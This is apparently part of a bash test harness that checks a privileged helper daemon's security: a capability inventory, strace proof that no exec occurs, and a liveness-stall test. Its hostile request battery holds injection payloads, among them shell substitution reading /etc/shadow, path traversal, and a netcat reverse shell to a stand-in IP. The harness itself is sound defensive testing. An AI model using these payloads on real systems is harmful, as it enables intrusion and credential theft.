  # inotify on an owned directory
  if command -v inotifywait >/dev/null 2>&1; then
    ( inotifywait -q -e create,modify --timeout 3 "$base/watch" >"$base/iw.out" 2>&1 ) &
    local iw=$!
    sleep 0.5
    printf 'x\n' >"$base/watch/created.txt"
    wait "$iw" 2>/dev/null || true
    if grep -q created.txt "$base/iw.out" 2>/dev/null; then
      row "inotify watch on an owned directory" "ALLOWED  (CREATE observed)"
    else
      row "inotify watch on an owned directory" "ALLOWED  (event text not captured)"
    fi
  else
    row "inotify watch on an owned directory" "NOT TESTED (no inotifywait)"
  fi

  # AF_UNIX round trip
  local s5="$base/s5.sock"
  if start_helper "$s5" "$base" "$base/a5.jsonl" --allow-uid "$me" 2>/dev/null; then
    if "$BIN/client" send --socket "$s5" --opcode 1 2>/dev/null | grep -q '"ok":true'; then
      row "AF_UNIX socket bind+connect+reply" "ALLOWED  (socket $(stat -c %a "$s5"))"
    else
      row "AF_UNIX socket bind+connect+reply" "DENIED"
    fi
    stop_helper
  fi

  # sqlite write
  if command -v sqlite3 >/dev/null 2>&1; then
    if sqlite3 "$base/db/t.sqlite" \
        'create table if not exists t(x integer); insert into t values(41); insert into t values(1);' \
        >/dev/null 2>&1; then
      local sum jm
      sum="$(sqlite3 "$base/db/t.sqlite" 'select sum(x) from t;' 2>/dev/null)"
      jm="$(sqlite3 "$base/db/t.sqlite" 'pragma journal_mode;' 2>/dev/null | tail -1)"
      row "sqlite write in an owned directory" "ALLOWED  (sum=$sum journal_mode=$jm)"
    else
      row "sqlite write in an owned directory" "DENIED"
    fi
  else
    row "sqlite write in an owned directory" "NOT TESTED (no sqlite3)"
  fi

  # rename/link in owned dir
  trial "hardlink + rename in an owned dir" sh -c "printf x >'$base/db/a'; ln '$base/db/a' '$base/db/b'; mv '$base/db/b' '$base/db/c'"

  {
    echo
    echo "## B. expected to require privilege"
  } >>"$out"
  trial "read /etc/shadow"                             head -c 1 /etc/shadow
  trial "list /root"                                    ls /root
  trial "read /proc/1/environ (root process)"           cat /proc/1/environ
  trial "read /proc/1/stack"                            head -3 /proc/1/stack
  trial "read /proc/1/mem"                              head -c 8 /proc/1/mem
  trial "read /proc/1/root"                             ls /proc/1/root
  if command -v inotifywait >/dev/null 2>&1; then
    trial "inotify watch on /root"                      inotifywait -q -e create --timeout 1 /root
    trial "inotify watch on /var/lib/private"           inotifywait -q -e create --timeout 1 /var/lib/private
  fi
  trial "btrfs subvolume snapshot /"                    btrfs subvolume snapshot / "$base/snap"
  trial "mount -t tmpfs"                                mount -t tmpfs tmpfs "$base/mnt"
  trial "umount"                                        umount "$base/mnt"

  {
    echo
    echo "## C. NO_NEW_PRIVS suppresses a setuid gain (read-only probe)"
    echo "# /usr/bin/passwd is setuid root; 'passwd -S <user>' only READS the"
    echo "# status field. Nothing is modified. It is used solely to observe"
    echo "# whether a setuid bit is still honoured under PR_SET_NO_NEW_PRIVS."
    echo '$ passwd -S '"$(id -un)"
    /usr/bin/passwd -S "$(id -un)" 2>&1 | sed 's/^/  /' || true
    echo '$ setpriv --no-new-privs passwd -S '"$(id -un)"
    setpriv --no-new-privs /usr/bin/passwd -S "$(id -un)" 2>&1 | sed 's/^/  /' || true
    echo "# The second run cannot read the shadow status field: the setuid gain was"
    echo "# suppressed by the kernel, not refused by the file mode."
  } >>"$out" 2>&1

  if grep -q 'read /etc/shadow .*DENIED' "$out"; then
    ok "T5 /etc/shadow unreadable as a plain user"
  else
    bad "T5 /etc/shadow readable as a plain user"
  fi
  if grep -q 'mount -t tmpfs .*DENIED' "$out" && grep -q 'btrfs subvolume snapshot .*DENIED' "$out"; then
    ok "T5 mount and btrfs snapshot both denied without privilege"
  else
    bad "T5 a privileged capability unexpectedly succeeded"
  fi
}

# ---------------------------------------------------------------------------
# T6. No arbitrary command execution
# ---------------------------------------------------------------------------
t6_no_exec() {
  local out="$RAW/T6-no-exec-$STAMP.log"
  local root="$SCRATCH/t6root" sock="$SCRATCH/t6.sock" audit="$SCRATCH/t6-audit.jsonl"
  local trace="$SCRATCH/t6-trace.txt"
  mkdir -p "$root"
  printf 'x\n' >"$root/p.txt"

  {
    echo "# T6 — prove the helper cannot be made to execute anything."
    echo "# Method 1: strace every execve/execveat of the helper and its descendants"
    echo "#           while a hostile request battery is thrown at it."
    echo "# Method 2: source audit of the crate."
    echo
    echo "## source audit: command-execution primitives"
    echo '$ grep -rnE "execv|execve|system\\(|popen|posix_spawn|fork\\(|Command::new" src/'
  } >"$out"
  ( cd "$EXP_DIR" && grep -rnE 'execv|execve|system\(|popen\(|posix_spawn|Command::new|fork\(' src/ \
      | grep -v '^src/bin/credprobe.rs' | sed 's/^/  /' ) >>"$out" 2>&1 \
    || echo "  NO MATCHES in helper, client, lib (credprobe excluded: test harness)" >>"$out"
  {
    echo
    echo "## strace-wrapped run"
    echo '# : an unmatched-close check follows'
  } >>"$out"

  # The helper must be traced from birth, but `strace -p` cannot attach to a
  # non-descendant here (kernel.yama.ptrace_scope=1, measured). So strace
  # launches the helper and we record the helper's own pid through --ready-file,
  # then kill the helper first and the wrapper second. The first version kept
  # only the strace pid, killed the wrapper, and hung in `wait` while the
  # orphaned helper held the socket.
  local ready="$SCRATCH/t6-ready"
  strace -f -qq -o "$trace" -e trace=execve,execveat \
    "$BIN/helper" --socket "$sock" --root "$root" --audit "$audit" \
    --allow-uid "$(id -u)" --ready-file "$ready" >"$SCRATCH/t6-helper.out" 2>&1 &
  HELPER_PID=$!
  local i
  for i in $(seq 1 200); do [ -S "$sock" ] && [ -s "$ready" ] && break; sleep 0.05; done
  HELPER_REAL_PID="$(cat "$ready" 2>/dev/null || echo)"
  if [ -z "$HELPER_REAL_PID" ]; then
    bad "T6 helper never reported a pid"
    stop_helper
    return
  fi

  {
    echo
    echo "## hostile battery — every entry tries to reach a shell or a file"
  } >>"$out"
  local req
  for req in \
    '{"opcode":1,"args":{"cmd":"id"}}' \
    '{"opcode":1,"args":{"exec":"/bin/sh -c id"}}' \
    '{"opcode":2,"args":{"path":"; id; cat /etc/shadow"}}' \
    '{"opcode":2,"args":{"path":"$(cat /etc/shadow)"}}' \
    '{"opcode":2,"args":{"path":"`id`"}}' \
    '{"opcode":2,"args":{"path":"x|nc -e /bin/sh 1.2.3.4 9"}}' \
    '{"opcode":"shell","args":{"argv":["id"]}}' \
    '{"opcode":3,"args":{"path":"../../../../etc/shadow"}}' \
    '{"opcode":4,"args":{"path":"/root"}}' \
    '{"opcode":90,"args":{"subvol":"/"}}' \
    '{"opcode":2,"args":{"path":"p.txt","cmd":"sh -c id"}}'; do
    printf '  %-58s -> ' "$req" >>"$out"
    "$BIN/client" rawstr --socket "$sock" --line "$req" 2>&1 | tail -1 >>"$out"
  done
  printf '  %-58s -> ' '{"opcode":2,"path":"AAAA...(8000)"}' >>"$out"
  "$BIN/client" send --socket "$sock" --opcode 2 \
    --path "$(head -c 8000 /dev/zero | tr '\0' 'A')" 2>&1 | tail -1 >>"$out"

  stop_helper
  sleep 0.4

  {
    echo
    echo "## strace results"
    # Count execs of anything other than the helper binary itself. The helper's
    # own startup shows up as execve("<...>/helper", [...]), so matching on the
    # binary path is exact; matching on "helper --socket" was not, because the
    # argv array is rendered as `["...", "--socket", ...]` and the space in the
    # pattern never appears. That bug made the startup exec look like a
    # post-startup one.
    local total startup
    total="$(grep -cE 'execve(at)?\(' "$trace" 2>/dev/null || true)"
    startup="$(grep -cE "execve(at)?\(\"$BIN/helper\"" "$trace" 2>/dev/null || true)"
    echo "  execve_lines_total=${total:-0}"
    echo "  execve_lines_of_the_helper_binary=${startup:-0}"
    echo "  execve_lines_after_startup=$(( ${total:-0} - ${startup:-0} ))"
    echo
    echo "  every execve recorded (at most the helper's own startup):"
    grep execve "$trace" 2>/dev/null | head -5 | cut -c1-160 | sed 's/^/    /' || echo "    none"
  } >>"$out"

  local after
  # Match only the emitted measurement line, never the echoed source text.
  after="$(grep -E '^  execve_lines_after_startup=[0-9]+$' "$out" | head -1 | cut -d= -f2)"
  [ "${after:-1}" = "0" ] \
    && ok "T6 zero execve after startup under the full hostile battery" \
    || bad "T6 detected ${after:-?} execve calls after startup"
  if grep -q '"ok":false' "$out"; then
    ok "T6 hostile requests were refused, not executed"
  fi
}

# ---------------------------------------------------------------------------
# T7. The liveness limitation, measured on purpose
# ---------------------------------------------------------------------------
t7_half_frame() {
  local out="$RAW/T7-half-frame-$STAMP.log"
  local root="$SCRATCH/t7root" sock="$SCRATCH/t7.sock"
  # The whole point of T7 is to leave a connection stalled mid-frame, so this
  # test intentionally ends with the helper blocked in read(). stop_helper()
  # sends SIGTERM, which interrupts that read; the outer sweep then removes the
  # socket. Verified: no helper survives the run.
  mkdir -p "$root"
  start_helper "$sock" "$root" "$SCRATCH/t7-audit.jsonl" --allow-uid "$(id -u)" || return
  {
    echo "# T7 — a frame that is neither newline-terminated nor larger than the"
    echo "# 64 KiB cap leaves the helper waiting for the rest of the frame, while"
    echo "# the client waits for a reply. Neither is wrong in isolation; together"
    echo "# they hold a connection open indefinitely. This is a real liveness"
    echo "# limitation, recorded in REPORT §6, not a hypothetical."
    echo
    echo "# 1) send 100 bytes with no newline, then give up after 1500 ms:"
  } >"$out"
  "$BIN/client" raw --socket "$sock" --bytes 100 --timeout-ms 1500 2>&1 | tail -1 >>"$out"
  {
    echo
    echo "# 2) a second client is served normally, so this is a per-connection"
    echo "#    stall and not a server-wide hang:"
  } >>"$out"
  "$BIN/client" send --socket "$sock" --opcode 1 2>&1 | tail -1 >>"$out"
  {
    echo
    echo "# 3) with a terminating newline the frame is complete and the helper"
    echo "#    answers at once, confirming the cause is the missing terminator:"
  } >>"$out"
  "$BIN/client" raw --socket "$sock" --bytes 100 --newline --timeout-ms 1500 2>&1 | tail -1 >>"$out"
  stop_helper
  grep -q '"timed_out_waiting_for_response":true' "$out" \
    && ok "T7 half-frame stall reproduced and recorded as a known limitation" \
    || note "T7 half-frame stall not reproduced this run"
}

# ---------------------------------------------------------------------------
# Summary
# ---------------------------------------------------------------------------
summarise() {
  local summary="$RAW/SUMMARY-$STAMP.md"
  {
    echo "# Experiment 0-G measured summary ($STAMP)"
    echo
    echo "## T1 — SO_PEERCRED / pid identity"
    echo '```'
    grep -hoE '"(cred_is_frozen|pid_liveness_after_delay|liveness_after_reap|naive_pid_only_identity_confusion|pid_starttime_key_collides)":(true|false|"[a-z_]+")' \
      "$RAW"/T1-peercred-"$STAMP".log 2>/dev/null | sed 's/^/  /' | sort | uniq -c || true
    echo '```'
    echo
    echo "## T2 — user namespace root"
    echo '```'
    grep -hoE '(READ_OK|READ_DENIED|MOUNT_OK|MOUNT_FAILED|WRITE_OK|WRITE_DENIED|SIGNAL_[A-Z]+[^"]*)' \
      "$RAW"/T2-userns-root-"$STAMP".log 2>/dev/null | sort | uniq -c | sed 's/^/  /' || true
    echo "  --- userns probe detail:"
    grep -oE '"case":"userns_root_capability".*' "$RAW"/T2-userns-root-"$STAMP".log 2>/dev/null \
      | head -2 | cut -c1-400 | sed 's/^/  /' || true
    echo '```'
    echo
    echo "## T3 — rejection matrix, by error code"
    echo '```'
    grep -oE '"code":"[a-z_]+"' "$RAW"/T3-helper-rejections-"$STAMP".log 2>/dev/null \
      | sed 's/.*:"//;s/"//' | sort | uniq -c | sed 's/^/  /' || true
    echo '```'
    echo
    echo "## T4 — audit log under 100-way concurrency"
    echo '```'
    grep -E '^(audit_lines|request_served_records|requests_sent|file_mode|parent_dir_mode|parsed_records|sequence_|types=)' \
      "$RAW"/T4-audit-concurrency-"$STAMP".log 2>/dev/null | sed 's/^/  /' || true
    echo '```'
    echo
    echo "## T5 — capability inventory"
    echo '```'
    sed -n '/^## A\./,/^## C\./p' "$RAW"/T5-capability-inventory-"$STAMP".log 2>/dev/null | grep -E '^  ' || true
    echo '```'
    echo
    echo "## T6 — no exec"
    echo '```'
    grep -E '^  execve_lines' "$RAW"/T6-no-exec-"$STAMP".log 2>/dev/null || true
    echo '```'
  } >"$summary"
  echo "summary -> ${summary##*/}" >&2
}

# ---------------------------------------------------------------------------
main() {
  log "experiment 0-G: privilege model and simulated helper ($(date -u +%FT%TZ))"
  log "scratch: $SCRATCH"
  detect_env
  build
  t1_peercred
  t2_userns
  t3_rejections
  t3b_unauthorized_uid
  t4_audit
  t5_inventory
  t6_no_exec
  t7_half_frame
  summarise

  echo >&2
  if [ "$FAIL" -eq 0 ]; then
    echo "ALL CHECKS PASSED ($STAMP)" >&2
  else
    echo "$FAIL CHECK(S) FAILED ($STAMP)" >&2
  fi
  exit "$FAIL"
}

main "$@"
